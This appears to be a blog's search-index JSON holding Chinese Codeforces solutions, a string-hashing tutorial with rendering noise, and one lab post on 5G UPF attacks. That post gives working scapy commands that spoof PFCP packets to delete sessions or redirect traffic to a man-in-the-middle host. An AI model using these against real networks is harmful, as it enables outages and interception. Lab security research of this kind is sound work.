&lt;&lt; 1, l, mid); build(u &lt;&lt; 1 | 1, mid + 1, r); pushup(u); }}void modify(int u, int x, int v) { if (tr[u].l == x &amp;&amp; tr[u].r == x) tr[u] = {x, x, v, v, v, v}; else { int mid = (tr[u].l + tr[u].r) &gt;&gt; 1; if (x &lt;= mid) modify(u &lt;&lt; 1, x, v); else modify(u &lt;&lt; 1 | 1, x, v); pushup(u); }}node query(int u, int l, int r) { if (tr[u].l &gt;= l &amp;&amp; tr[u].r &lt;= r) return tr[u]; int mid = (tr[u].l + tr[u].r) &gt;&gt; 1; if (r &lt;= mid) return query(u &lt;&lt; 1, l, r); else if (l &gt; mid) return query(u &lt;&lt; 1 | 1, l, r); else { auto left = query(u &lt;&lt; 1, l, r); auto right = query(u &lt;&lt; 1 | 1, l, r); node res; pushup(res, left, right); return res; }}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int k, x; cin &gt;&gt; n &gt;&gt; k &gt;&gt; x; if (x &lt; 0) { x = -x; k = n - k; } for (int i = 1; i &lt;= n; i++) { cin &gt;&gt; w[i]; w[i] -= x; } x *= 2; build(1, 1, n); if (k == 0) { cout &lt;&lt; max(0LL, query(1, 1, n).tmax) &lt;&lt; &quot;\\n&quot;; continue; } for (int i = 1; i &lt;= k - 1; i++) { modify(1, i, w[i] + x); } long long ans = 0; for (int i = k; i &lt;= n; i++) { if (i - k &gt;= 1) { modify(1, i - k, w[i - k]); } modify(1, i, w[i] + x); ans = max(ans, query(1, 1, n).tmax); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;}","link":"/2023/03/01/CF-1796/"},{"title":"字符串哈希","text":"定义 我们定义一个把字符串映射到整数的函数 fff ，这个 fff 称为是 Hash 函数。 我们希望这个函数 fff 可以方便地帮我们判断两个字符串是否相等。 Hash 的思想 Hash 的核心思想在于，将输入映射到一个值域较小、可以方便比较的范围。 这里的「值域较小」在不同情况下意义不同。 在 哈希表 中，值域需要小到能够接受线性的空间与时间复杂度。 在字符串哈希中，值域需要小到能够快速比较（ 10910^9109 、101810^{18}1018 都是可以快速比较的）。 同时，为了降低哈希冲突率，值域也不能太小。 性质 具体来说，哈希函数最重要的性质可以概括为下面两条： 在 Hash 函数值不一样的时候，两个字符串一定不一样； 在 Hash 函数值一样的时候，两个字符串不一定一样（但有大概率一样，且我们当然希望它们总是一样的）。 Hash 函数值一样时原字符串却不一样的现象我们成为哈希碰撞。 解释 我们需要关注的是什么？ 时间复杂度和 Hash 的准确率。 通常我们采用的是多项式 Hash 的方法，对于一个长度为 lll 的字符串 sss 来说，我们可以这样定义多项式 Hash 函数： f(s)=∑i=1ls[i]×bl−i (mod M)f(s) = \\sum _{i = 1} ^{l} s[i] \\times b^{l - i}\\ (mod\\ \\ M)f(s)=∑i=1l​s[i]×bl−i (mod M) 。例如，对于字符串 xyzxyzxyz ，其哈希函数值为 xb2+yb+zxb^2 + yb + zxb2+yb+z 。 特别要说明的是，也有很多人使用的是另一种 Hash 函数的定义，即 f(s)=∑i=1ls[i]×bi−1 (mod M)f(s) = \\sum _{i = 1} ^{l} s[i] \\times b^{i - 1}\\ (mod\\ \\ M)f(s)=∑i=1l​s[i]×bi−1 (mod M) ，这种定义下，同样的字符串 xyzxyzxyz 的哈希值就变为了 x+yb+zb2x + yb + zb^2x+yb+zb2 了。 显然，上面这两种哈希函数的定义函数都是可行的，但二者在之后会讲到的计算子串哈希值时所用的计算式是不同的，因此千万注意 不要弄混了这两种不同的 Hash 方式。 由于前者的 Hash 定义计算更简便、使用人数更多、且可以类比为一个 bbb 进制数来帮助理解，所以本文下面所将要讨论的都是使用 f(s)=∑i=1ls[i]×b&lt;!−−swig￼1−−&gt; (mod M)f(s) = \\sum _{i = 1} ^{l} s[i] \\times b^NaN\\ (mod\\ \\ M)f(s)=∑i=1l​s[i]×b&lt;!−−swig￼1−−&gt; (mod M) 来定义的 Hash 函数。 下面讲一下如何选择 MMM 和计算哈希碰撞的概率。 这里 MMM 需要选择一个素数（至少要比最大的字符要大）， bbb 可以任意选择。 如果我们用未知数 xxx 替代 bbb ，那么 f(s)f(s)f(s) 实际上是多项式环 ZM[x]\\Z_M[x]ZM​[x] 上的一个多项式。考虑两个不同的字符串 s,ts,ts,t ，有 f(s)=f(t)f(s) = f(t)f(s)=f(t) 。我们记 h(x)=f(s)−f(t)=∑i=1l(s[i]−t[i])xl−i (mod M)h(x) = f(s) - f(t) = \\sum _{i = 1} ^{l} (s[i] - t[i]) x^{l - i}\\ (mod\\ M)h(x)=f(s)−f(t)=∑i=1l​(s[i]−t[i])xl−i (mod M) ，其中 l=max(∣s∣,∣t∣)l = max(|s|, |t|)l=max(∣s∣,∣t∣) 。可以发现 h(x)h(x)h(x) 是一个 l−1l - 1l−1 阶的非零多项式。 如果 sss 与 ttt 在 x=bx = bx=b 的情况下哈希碰撞，则 bbb 是 h(x)h(x)h(x) 的一个根。由于 h(x)h(x)h(x) 在 ZM\\Z_MZM​ 是一个域（等价于 MMM 是一个素数，这也是为什么 MMM 要选择素数的原因）的时候，最多有 l−1l - 1l−1 个根，如果我们保证 bbb 是从 [0,M)[0, M)[0,M) 之间均匀随机选取的，那么 f(s)f(s)f(s) 与 f(t)f(t)f(t) 碰撞的概率可以估计为 l−1M\\frac{l - 1}{M}Ml−1​ 。简单验算一下，可以发现如果两个字符串长度都是 111 的时候，哈希碰撞的概率为 l−1M=0\\frac{l - 1}{M} = 0Ml−1​=0 ，此时不可能发生碰撞。 Hash 的分析与改进 错误率 若进行 nnn 次比较，每次错误率 1M\\frac{1}{M}M1​ ，那么总错误率是 1−(1−1M)n1 - (1 - \\frac{1}{M})^n1−(1−M1​)n 。在随机数据下，若 M=109+7M = 10^9 + 7M=109+7 ，n=109n = 10^9n=109 ，错误率约为 11000\\frac{1}{1000}10001​ ，并不是能够完全忽略不计的。 所以，进行字符串哈希时，经常会对两个大质数分别取模，这样的话哈希函数的值域就能扩大到两者之积，错误率就非常小了。 多次询问子串哈希 单次计算一个字符串的哈希值复杂度是 O(n)O(n)O(n) ，其中 nnn 为串长，与暴力匹配没有区别，如果需要多次询问一个字符串的子串的哈希值，每次重新计算效率非常低下。 一般采取的方法是对整个字符串先预处理出每个前缀的哈希值，将哈希值看成一个 bbb 进制的数对 MMM 取模的结果，这样的话每次就能快速求出子串的哈希了： 令 fi(s)f_i(s)fi​(s) 表示 f(s[1..i])f(s[1..i])f(s[1..i]) ，即原串长度为 iii 的前缀的哈希值，那么按照定义有 fi(s)=s[1]⋅bi−1+s[2]⋅bi−2+⋯+s[i−1]⋅b+s[i]f_i(s) = s[1] \\cdot b^{i - 1} + s[2] \\cdot b^{i - 2} + \\dots + s[i - 1] \\cdot b + s[i]fi​(s)=s[1]⋅bi−1+s[2]⋅bi−2+⋯+s[i−1]⋅b+s[i] 现在，我们想要用类似前缀和的方式快速求出 f(s[l..r])f(s[l..r])f(s[l..r]) ，按照定义有字符串 s[l..r]s[l..r]s[l..r] 的哈希值为 f(s[l..r])=s[l]⋅br−l+s[l+1]⋅br−l−1+⋯+s[r−1]⋅b+s[r]f(s[l..r]) = s[l] \\cdot b^{r - l} + s[l + 1] \\cdot b^{r - l - 1} + \\dots + s[r - 1] \\cdot b + s[r]f(s[l..r])=s[l]⋅br−l+s[l+1]⋅br−l−1+⋯+s[r−1]⋅b+s[r] 对比观察上述两个式子，我们发现 f(s[l..r])=fr(s)−fl−1(s)×br−l+1f(s[l..r]) = f_r(s) - f_{l - 1}(s) \\times b^{r - l + 1}f(s[l..r])=fr​(s)−fl−1​(s)×br−l+1 成立（可以手动代入验证一下），因此我们用这个式子就可以快速得到子串的哈希值。其中 br−l+1b^{r - l + 1}br−l+1 可以 O(n)O(n)O(n) 的预处理出来然后 O(1)O(1)O(1) 地回答每次询问（当然也可以快速幂 O(log n)O(log\\ n)O(log n) 的回答每次询问）。 模板 123456789101112131415161718192021222324252627282930313233343536373839404142const int L = 2e6 + 5;const int HASH_CNT = 2;int hashBase[HASH_CNT] = {29, 31}; // {13331, 23333}int hashMod[HASH_CNT] = {int(1e9 + 9), 998244353}; // {1e9 + 7, 1e9 + 9}struct StringWithHash { char s[L]; int ls; int hsh[HASH_CNT][L]; int pwMod[HASH_CNT][L]; void init() { // 初始化 ls = 0; for (int i = 0; i &lt; HASH_CNT; ++i) { hsh[i][0] = 0; pwMod[i][0] = 1; } } StringWithHash() { init(); } void extend(char c) { s[++ls] = c; // 记录字符数和每一个字符 for (int i = 0; i &lt; HASH_CNT; ++i) { // 双哈希的预处理 pwMod[i][ls] = 1ll * pwMod[i][ls - 1] * hashBase[i] % hashMod[i]; // 得到b^ls hsh[i][ls] = (1ll * hsh[i][ls - 1] * hashBase[i] + c) % hashMod[i]; } } vector&lt;int&gt; getHash(int l, int r) { // 得到哈希值 vector&lt;int&gt; res(HASH_CNT, 0); for (int i = 0; i &lt; HASH_CNT; ++i) { int t = (hsh[i][r] - 1ll * hsh[i][l - 1] * pwMod[i][r - l + 1]) % hashMod[i]; t = (t + hashMod[i]) % hashMod[i]; res[i] = t; } return res; }};","link":"/2023/01/08/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%93%88%E5%B8%8C/"},{"title":"post","text":"记录一下最近做 UPF 会话劫持的心得体会。 环境配置 UERANSIM：https://github.com/aligungr/UERANSIM/wiki/Installation free5gc：https://github.com/free5gc/free5gc/wiki/Installation gtp5g：https://github.com/free5gc/gtp5g（运行 UPF 网元所需，可在 free5gc 的文件夹里配置） UERANSIM + free5gc：https://www.free5gc.org/installations/stage-3-sim-install/ 官方教程大都很详细了，下面列出一些配置过程中需要注意的地方。 git ubuntu 中配置环境很多时候都要用到 git clone 命令，这时可以考虑使用 github 镜像： 1git config --global url.&quot;https://kgithub.com/&quot;.insteadOf &quot;https://github.com/&quot; 执行该条命令后访问 https://github.com/ 开头的资源都会被替换为国内 https://kgithub.com/ 的镜像。 go free5gc 运行过程中涉及到很多 go 包的下载，可以通过以下命令设置为国内代理。 1go env -w GOPROXY=https://goproxy.cn free5gc shell 在 UERANSIM + free5gc 的教程中核心网主机需要执行以下四条命令，主要功能是对来自 UERANSIM 的数据包进行转发封装，使得自己成为 UERANSIM 与外网间的一个中继： 1234sudo sysctl -w net.ipv4.ip_forward=1sudo iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADEsudo systemctl stop ufwsudo iptables -I FORWARD 1 -j ACCEPT 在第二条命令中，需要将 enp0s3 替换为系统的默认网卡，如 ubuntu 20.04 中即为 ens33 。 clone UPF 进行断网和劫持攻击需要克隆一台新的虚拟机来运行 UPF 网元，本机的环回地址无法执行以上攻击。 另外，克隆主机需要将 upfcfg 文件中的一些参数改为本机 ip 。 config free5gc 主要需要对 amfcfg、smfcfg、upfcfg 这三个文件进行设置， 在旧版本中，UPF 网元的配置文件目录为 free5gc/NFs/upf/build/config/upfcfg.yaml，二进制文件目录为 free5gc/NFs/upf/build/bin/free5gc-upfd，启动命令为 sudo -E ./bin/free5gc-upfd ； 在新版本中，UPF 网元的配置与二进制文件与其他网元一样，分别在 free5gc/bin 和 free5gc/config 这两个目录下。 以下只列出配置文件中的更改项。 AMF 12ngapIpList: # the IP list of N2 interfaces on this AMF - 192.168.163.128 # UERANSIM 所在主机 IP，用于监听 NGAP 消息 SMF 123456789pfcp: addr: 192.168.163.128 # 本机 IP，用于向 UPF 发送 PFCP 消息 UPF: nodeID: 192.168.163.129 # UPF 网元所在主机 IP，即克隆主机 IP interfaces: endpoints: # UPF 网元所在主机 IP，即克隆主机 IP - 192.168.163.129 UPF 1234567pfcp: addr: 192.168.163.129 # UPF 网元所在主机 IP，即克隆主机 IP nodeID: 192.168.163.129 # 同上gtpu: ifList: - addr: 192.168.163.129 # 同上 UPF 攻击 根据 UERANSIM 注册过程中抓到的 PFCP 包可进行以下两种攻击。 断网攻击 步骤 向 UPF 所在主机发送 Sx Session Deletion Request 包。 123from scapy.all import *send(IP(src=&quot;192.168.163.128&quot;,dst=&quot;192.168.163.129&quot;)/UDP(dport=8805,sport=8805)/bytes([0x23,0x36,0x00,0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x07,0xc0])) 注意事项 SEID 字段的值需为 1，0 用于 Establishment ，旧版本中 2 及以上会报段错误。 效果 UPF 删除已有会话，UERANSIM 侧无法上网。 会话劫持 步骤 向 UPF 所在主机发送 Sx Session Modification Request 包。 将包中 Outer Header Creation 字段改为中间人 IP 。 代码 123from scapy.all import *send(IP(src=&quot;192.168.163.128&quot;,dst=&quot;192.168.163.129&quot;)/UDP(dport=8805,sport=8805)/bytes([0x23,0x34,0x00,0x90,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x12,0xc0,0x00,0x39,0x00,0x0d,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x06,0xc0,0xa8,0xa3,0x80,0x00,0x09,0x00,0x35,0x00,0x38,0x00,0x02,0x00,0x0c,0x00,0x1d,0x00,0x04,0x00,0x00,0x00,0xff,0x00,0x02,0x00,0x1b,0x00,0x14,0x00,0x01,0x02,0x00,0x16,0x00,0x09,0x08,0x69,0x6e,0x74,0x65,0x72,0x6e,0x65,0x74,0x00,0x5d,0x00,0x05,0x06,0x0a,0x3c,0x00,0x06,0x00,0x6c,0x00,0x04,0x00,0x00,0x00,0x0c,0x00,0x0a,0x00,0x36,0x00,0x6c,0x00,0x04,0x00,0x00,0x00,0x0c,0x00,0x2c,0x00,0x01,0x02,0x00,0x0b,0x00,0x25,0x00,0x2a,0x00,0x01,0x00,0x00,0x16,0x00,0x09,0x08,0x69,0x6e,0x74,0x65,0x72,0x6e,0x65,0x74,0x00,0x54,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x06,0xc0,0xa8,0xa3,0x80,0x00,0x31,0x00,0x01,0x00])) 效果 原本 UPF -&gt; UERANSIM 的包都会发给中间人。","link":"/2023/04/19/post/"},{"title":"Hello 2023","text":"新年快乐~ 比赛链接：https://codeforces.com/contest/1779 A. Hall of Fame 题解 构造 RL 。 代码 123456789101112131415161718192021222324252627282930313233343536#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; string s; cin &gt;&gt; s; if ((int)set(s.begin(), s.end()).size() == 1) { cout &lt;&lt; -1 &lt;&lt; &quot;\\n&quot;; continue; } if (s.find(&quot;RL&quot;) != string::npos) { cout &lt;&lt; 0 &lt;&lt; &quot;\\n&quot;; } else { for (int i = 0; i + 1 &lt; n; i++) { if (s[i] == 'L' and s[i + 1] == 'R') { cout &lt;&lt; i + 1 &lt;&lt; &quot;\\n&quot;; break; } } } } return 0;} B. MKnez’s ConstructiveForces Task 题解 当 nnn 为偶数时，构造 −1，1-1， 1−1，1 即可。 当 nnn 为奇数时，以 n=5n = 5n=5 为例，当 i=1,2,3,4i = 1, 2, 3, 4i=1,2,3,4 时，有： s3+s4+s5=0s_3 + s_4 + s_5 = 0s3​+s4​+s5​=0 s1+s4+s5=0s_1 + s_4 + s_5 = 0s1​+s4​+s5​=0 s1+s2+s5=0s_1 + s_2 + s_5 = 0s1​+s2​+s5​=0 s1+s2+s3=0s_1 + s_2 + s_3= 0s1​+s2​+s3​=0 相邻等式相减得： s1=s3=s5s_1 = s_3 = s_5s1​=s3​=s5​ s2=s4s_2 = s_4s2​=s4​ 即在 sss 中，奇数项与偶数项的值各自相同。 设奇数项的值为 aaa ，偶数项的值为 bbb ，根据题设，有： (n+1)2a+(n−1)2b=a+b\\frac{(n + 1)}{2}a + \\frac{(n - 1)}{2}b = a + b2(n+1)​a+2(n−1)​b=a+b 化简得： (n−1)a=−(n−3)b(n - 1)a = -(n - 3)b(n−1)a=−(n−3)b 所以令 a=−(n−3),b=(n−1)a = -(n - 3), b = (n - 1)a=−(n−3),b=(n−1) 即可，由于 si≠0s_i \\ne 0si​=0 ，故 n=3n = 3n=3 时无解。 代码 12345678910111213141516171819202122232425262728293031323334#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; if (n &amp; 1) { if (n == 3) { cout &lt;&lt; &quot;NO&quot; &lt;&lt; &quot;\\n&quot;; } else { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; for (int i = 0; i &lt; n; i++) { cout &lt;&lt; (i &amp; 1 ? (n - 1) : -(n - 3)) &lt;&lt; &quot; \\n&quot;[i == n - 1]; } } } else { cout &lt;&lt; &quot;YES&quot; &lt;&lt; &quot;\\n&quot;; for (int i = 0; i &lt; n; i++) { cout &lt;&lt; (i &amp; 1 ? 1 : -1) &lt;&lt; &quot; \\n&quot;[i == n - 1]; } } } return 0;} C. Least Prefix Sum 题解 因为 a1+a2+⋯+ama_1 + a_2 + \\dots + a_ma1​+a2​+⋯+am​ 是最小的前缀和之一，所以： 以 ama_mam​ 为右端点的后缀和不能大于 000 以 am+1a_{m + 1}am+1​ 为左端点的前缀和不能小于 000 注意在后缀和中，左端点最多取到 a2a_2a2​ ，不能取到 a1a_1a1​ 。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } int ans = 0; { priority_queue&lt;int&gt; pque; long long sum = 0; for (int i = m - 1; i &gt; 0; i--) { sum += a[i]; if (a[i] &gt; 0) { pque.push(a[i]); } while (sum &gt; 0) { int x = pque.top(); pque.pop(); sum -= 2 * x; ans += 1; } } } { priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; pque; long long sum = 0; for (int i = m; i &lt; n; i++) { sum += a[i]; if (a[i] &lt; 0) { pque.push(a[i]); } while (sum &lt; 0) { int x = pque.top(); pque.pop(); sum -= 2 * x; ans += 1; } } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} D. Boris and His Amazing Haircut 题解 如果有 ai&lt;bia_i &lt; b_iai​&lt;bi​ ，则无解。 否则，对于每个不相等的 ai,bia_i, b_iai​,bi​ ，查询最右端不大于 bib_ibi​ 的值 bjb_jbj​ ，将下标区间 [i,j][i, j][i,j] 中值为 bib_ibi​ 的数都标记为访问过即可。 查询区间内第一个大于 bib_ibi​ 的数可以用线段树，查询区间内值为 bib_ibi​ 的数的下标可以用 map&lt;int, queue&lt;int&gt;&gt; 。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;bits/stdc++.h&gt;using namespace std;#define ls (o&lt;&lt;1)#define rs ((o&lt;&lt;1)|1)#define mid ((l+r)&gt;&gt;1)const int N = 2e5 + 100;int tree[4 * N];void build(int o, int l, int r, vector&lt;int&gt;&amp; b) { if (l == r) { tree[o] = b[l - 1]; return; } build(ls, l, mid, b); build(rs, mid + 1, r, b); tree[o] = max(tree[ls], tree[rs]);}int get(int o, int l, int r, int x) { if (l == r) return l; return tree[ls] &gt; x ? get(ls, l, mid, x) : get(rs, mid+1, r, x);}int query(int o, int l, int r, int ql, int qr, int x) { //查询[ql, qr]内第一个大于 x 的数的位置 if (qr &lt; l || r &lt; ql) return -1; if (ql &lt;= l &amp;&amp; r &lt;= qr) return tree[o] &gt; x ? get(o, l, r, x) : -1; int t = query(ls, l, mid, ql, qr, x); return t != -1 ? t : query(rs, mid + 1, r, ql, qr, x);}int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;int&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i]; } vector&lt;int&gt; b(n); map&lt;int, queue&lt;int&gt;&gt; mp; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; b[i]; mp[b[i]].push(i); } build(1, 1, n, b); int m; cin &gt;&gt; m; vector&lt;int&gt; x(m); for (int i = 0; i &lt; m; i++) { cin &gt;&gt; x[i]; } bool ok = true; for (int i = 0; i &lt; n; i++) { if (a[i] &lt; b[i]) { ok = false; break; } } multiset&lt;int&gt; mst(x.begin(), x.end()); vector&lt;bool&gt; vis(n); for (int i = 0; i &lt; n; i++) { if (vis[i]) { continue; } if (a[i] != b[i]) { if (mst.find(b[i]) == mst.end()) { ok = false; break; } else { mst.erase(mst.find(b[i])); } int r = query(1, 1, n, i + 1, n, b[i]); r = (r == -1 ? n : r - 1); while (not mp[b[i]].empty() and mp[b[i]].front() &lt; r) { vis[mp[b[i]].front()] = true; mp[b[i]].pop(); } } } cout &lt;&lt; (ok ? &quot;YES&quot; : &quot;NO&quot;) &lt;&lt; &quot;\\n&quot;; } return 0;}","link":"/2023/01/04/Hello%202023/"},{"title":"Codeforces Round 857 (Div. 2)【A - E】","text":"D 题有一个细节没处理好 FST 了，E 题没想好树状数组怎么清空，不过思路基本上对了。 最后居然也上了一分……继续努力吧。 比赛链接：https://codeforces.com/contest/1802 A. Likes 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; map&lt;int, int&gt; mp; for (int i = 0; i &lt; n; i++) { int x; cin &gt;&gt; x; mp[abs(x)] += 1; } int one = 0, two = 0; for (auto [x, y] : mp) { (y == 1 ? one : two) += 1; } for (int i = 1; i &lt;= one + two; i++) { cout &lt;&lt; i &lt;&lt; ' '; } for (int i = 1; i &lt;= two; i++) { cout &lt;&lt; one + two - i &lt;&lt; ' '; } cout &lt;&lt; &quot;\\n&quot;; for (int i = 1; i &lt;= two; i++) { cout &lt;&lt; 1 &lt;&lt; ' ' &lt;&lt; 0 &lt;&lt; ' '; } for (int i = 1; i &lt;= one; i++) { cout &lt;&lt; i &lt;&lt; ' '; } cout &lt;&lt; &quot;\\n&quot;; } return 0;} B. Settlement of Guinea Pigs 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; int ans = 0, cur = 0, one = 0; for (int i = 0; i &lt; n; i++) { int x; cin &gt;&gt; x; if (x == 1) { cur += 1; one += 1; ans = max(ans, cur); } else { if (one == 0) { continue; } if (one &amp; 1) { cur -= (one - ((one - 1) / 2 + 1)); one = 1; } else { cur -= (one - ((one - 2) / 2 + 2)); one = 2; } } } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} C. The Very Beautiful Blanket 123456789101112131415161718192021222324#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n, m; cin &gt;&gt; n &gt;&gt; m; cout &lt;&lt; n * m &lt;&lt; &quot;\\n&quot;; for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; m; j++) { cout &lt;&lt; (1 &lt;&lt; (__lg(m) + 1)) * i + j &lt;&lt; &quot; \\n&quot;[j == m - 1]; } } } return 0;} D. Buying gifts 题解 排序后枚举第一个人所选的最大值。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;bits/stdc++.h&gt;using namespace std;int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;pair&lt;int, int&gt;&gt; a(n); for (int i = 0; i &lt; n; i++) { cin &gt;&gt; a[i].first &gt;&gt; a[i].second; } sort(a.begin(), a.end()); vector&lt;int&gt; dp(n); for (int i = n - 1; i &gt;= 0; i--) { if (i == n - 1) { dp[i] = a[i].second; } else { dp[i] = max(dp[i + 1], a[i].second); } } int ans = INT_MAX; set&lt;int&gt; st; for (int i = 0; i &lt; n; i++) { int mx = -1; if (i + 1 &lt; n) { mx = dp[i + 1]; ans = min(ans, abs(mx - a[i].first)); } auto it = st.lower_bound(a[i].first); if (it != st.end() and *it &gt;= mx) { ans = min(ans, *it - a[i].first); } if (it != st.begin() and not st.empty() and *prev(it) &gt;= mx) { ans = min(ans, a[i].first - *prev(it)); } st.insert(a[i].second); } cout &lt;&lt; ans &lt;&lt; &quot;\\n&quot;; } return 0;} E. Music Festival 题解 将每个序列处理为严格递增后按右端点从小到大排序，之后对每个序列的右端点进行 dp，用树状数组查询和更新以该右端点结尾的最大长度。 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;bits/stdc++.h&gt;using namespace std;struct Fenwick_tree { vector&lt;int&gt; bit; Fenwick_tree(int n) : bit(n) {} void update(int pos, int val) { for (int i = pos; i &lt;= (int)bit.size(); i += i &amp; (-i)) { bit[i] = max(bit[i], val); } } void clear(int pos) { for (int i = pos; i &lt;= (int)bit.size(); i += i &amp; (-i)) { bit[i] = 0; } } int query(int l, int r) { return query(r) - query(l - 1); } int query(int pos) { int res = 0; for (int i = pos; i &gt;= 1; i -= i &amp; (-i)) { res = max(res, bit[i]); } return res; }} F(2e5 + 10); // 也可以每次开 O(n) 的然后把所有值离散化int main() { ios::sync_with_stdio(false); cin.tie(nullptr); int t; cin &gt;&gt; t; while (t--) { int n; cin &gt;&gt; n; vector&lt;vector&lt;int&gt;&gt; a(n); for (int i = 0; i &lt; n; i++) { int k; cin &gt;&gt; k; int pre = -1; for (int j = 0; j &lt; k; j++) { int x; cin &gt;&gt; x; if (x &gt; pre) { a[i].push_back(x); pre = x; } } } sort(a.begin(), a.end(), [](auto&amp; x, auto&amp; y) { return x.back() &lt; y.back(); }); for (auto vec : a) { int mx = 0; for (int i = 0; i &lt; (int)vec.size(); i++) { mx = max(mx, (int)vec.size() - i + F.query(vec[i] - 1)); } F.update(vec.back(), mx); } cout &lt;&lt; F.query(2e5 + 1) &lt;&lt; &quot;\\n&quot;; for (auto vec : a) { F.clear(vec.back()); } } return 0;}","link":"/2023/03/10/CF-1802/"}],"tags":[{"name":"字符串哈希","slug":"字符串哈希","link":"/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%93%88%E5%B8%8C/"},{"name":"Z Algorithm（扩展 KMP）","slug":"Z-Algorithm（扩展-KMP）","link":"/tags/Z-Algorithm%EF%BC%88%E6%89%A9%E5%B1%95-KMP%EF%BC%89/"},{"name":"数论","slug":"数论","link":"/tags/%E6%95%B0%E8%AE%BA/"},{"name":"数学","slug":"数学","link":"/tags/%E6%95%B0%E5%AD%A6/"},{"name":"双指针","slug":"双指针","link":"/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"},{"name":"组合数学","slug":"组合数学","link":"/tags/%E7%BB%84%E5%90%88%E6%95%B0%E5%AD%A6/"},{"name":"K叉树","slug":"K叉树","link":"/tags/K%E5%8F%89%E6%A0%91/"},{"name":"贪心","slug":"贪心","link":"/tags/%E8%B4%AA%E5%BF%83/"},{"name":"枚举","slug":"枚举","link":"/tags/%E6%9E%9A%E4%B8%BE/"},{"name":"拓扑排序","slug":"拓扑排序","link":"/tags/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/"},{"name":"dp","slug":"dp","link":"/tags/dp/"},{"name":"树状数组","slug":"树状数组","link":"/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"},{"name":"概率dp","slug":"概率dp","link":"/tags/%E6%A6%82%E7%8E%87dp/"},{"name":"meet in the middle","slug":"meet-in-the-middle","link":"/tags/meet-in-the-middle/"},{"name":"构造","slug":"构造","link":"/tags/%E6%9E%84%E9%80%A0/"},{"name":"BFS","slug":"BFS","link":"/tags/BFS/"},{"name":"bitmasks","slug":"bitmasks","link":"/tags/bitmasks/"},{"name":"容斥定理","slug":"容斥定理","link":"/tags/%E5%AE%B9%E6%96%A5%E5%AE%9A%E7%90%86/"},{"name":"概率期望","slug":"概率期望","link":"/tags/%E6%A6%82%E7%8E%87%E6%9C%9F%E6%9C%9B/"},{"name":"强连通分量","slug":"强连通分量","link":"/tags/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F/"},{"name":"tarjan","slug":"tarjan","link":"/tags/tarjan/"},{"name":"kosaraju","slug":"kosaraju","link":"/tags/kosaraju/"},{"name":"区间合并","slug":"区间合并","link":"/tags/%E5%8C%BA%E9%97%B4%E5%90%88%E5%B9%B6/"},{"name":"差分","slug":"差分","link":"/tags/%E5%B7%AE%E5%88%86/"},{"name":"二分","slug":"二分","link":"/tags/%E4%BA%8C%E5%88%86/"},{"name":"字符串","slug":"字符串","link":"/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"线段树——最大连续子段和","slug":"线段树——最大连续子段和","link":"/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91%E2%80%94%E2%80%94%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%AE%B5%E5%92%8C/"},{"name":"线段树——区间查询第一个大于 x 